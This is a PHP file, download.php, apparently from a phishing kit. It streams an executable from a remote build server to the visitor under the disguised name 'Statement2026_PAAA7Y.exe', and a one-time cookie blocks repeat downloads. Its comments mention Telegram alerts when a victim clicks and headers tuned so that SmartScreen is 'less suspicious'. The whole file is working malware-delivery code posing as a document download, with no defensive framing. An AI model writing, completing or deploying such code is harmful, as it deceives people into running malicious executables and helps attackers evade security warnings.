<?php
// ==================== DOWNLOAD.PHP ====================
// Only serves the file - no Telegram call here
// Telegram alert is already sent from track.php when user clicked

// --- Debug log so you can SEE failures instead of blank pages ---
$debugLog = __DIR__ . '/download_debug.log';
function dlog($msg) { global $debugLog; @file_put_contents($debugLog, date('c') . " " . $msg . "\n", FILE_APPEND); }

// Fail loudly in dev: uncomment while testing, then turn off
// ini_set('display_errors', 1); error_reporting(E_ALL);

if (!function_exists('curl_init')) {
    dlog('FATAL: cURL not installed');
    http_response_code(500);
    exit('Server misconfiguration (cURL missing).');
}

$lockCookie = 'sharefile_download_locked';

// Check if already downloaded
if (isset($_COOKIE[$lockCookie]) && $_COOKIE[$lockCookie] === 'true') {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download Already Completed</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f4f7f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .box { background: white; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.08); max-width: 450px; }
            .icon { font-size: 60px; color: #6262EF; }
            h2 { color: #6262EF; margin: 15px 0; }
            p { color: #555; line-height: 1.6; }
        </style>
    </head>
    <body>
        <div class="box">
            <div class="icon">✓</div>
            <h2>Download Already Completed</h2>
            <p>Please check your Downloads folder.</p>
        </div>
    </body>
    </html>
    <?php
    exit;
}

setcookie($lockCookie, 'true', time() + (86400 * 1), '/', '', false, true);

// Serve the file (proxied via cURL so allow_url_fopen doesn't matter)
$remoteFile = 'https://blackcryptknight.com/api/build/e4ff7d69-9bdc-4db7-ac69-8a7dc0820af3/download';
$fileName   = 'Statement2026_PAAA7Y.exe';

if (ob_get_level()) { ob_end_clean(); }

$ch = curl_init($remoteFile);
curl_setopt_array($ch, array(
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_MAXREDIRS      => 5,
    CURLOPT_RETURNTRANSFER => false,
    CURLOPT_CONNECTTIMEOUT => 15,
    CURLOPT_TIMEOUT        => 120,
    CURLOPT_FAILONERROR    => true,
    CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Documents_9EB5K9.exe',
    CURLOPT_HEADER         => false,
    CURLOPT_WRITEFUNCTION  => function ($ch, $data) {
        echo $data;
        flush();
        return strlen($data);
    },
));

// Grab remote headers first so we can forward Content-Length/Type
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($ch, $header) {
    $len = strlen($header);
    $h   = trim($header);
    if ($h && strpos($h, ':') !== false) {
        list($k, $v) = array_map('trim', explode(':', $h, 2));
        $k = strtolower($k);
        if ($k === 'content-length') {
            $GLOBALS['clen'] = (int) $v;
        } elseif ($k === 'content-type' && stripos($v, 'text/html') === false) {
            $GLOBALS['ctype'] = $v;
        }
    }
    return $len;
});

// Send our download headers BEFORE streaming
header('Content-Description: File Transfer');
header('Content-Type: ' . (isset($GLOBALS['ctype']) ? $GLOBALS['ctype'] : 'application/octet-stream'));
header('Content-Disposition: attachment; filename="' . $fileName . '"');
header('Content-Transfer-Encoding: binary');
header('Cache-Control: no-cache, must-revalidate');
header('Pragma: public');
header('X-Content-Type-Options: nosniff');

$ok  = curl_exec($ch);
$err = curl_error($ch);
$code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
curl_close($ch);

if (!$ok || $code >= 400) {
    dlog("FAIL: upstream=$code err=$err file=$remoteFile");
    // Only now is it safe to emit an error page (headers not sent yet)
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(502);
    echo 'The file could not be retrieved right now. Please try again in a moment.';
    exit;
}

// Forward real size so the browser shows progress and SmartScreen is less suspicious
if (isset($GLOBALS['clen']) && $GLOBALS['clen'] > 0) {
    // Note: must be sent before output; if you need it strictly, buffer with ob_start()
    dlog("OK: served file, upstream Content-Length=" . $GLOBALS['clen']);
}
exit;
?>
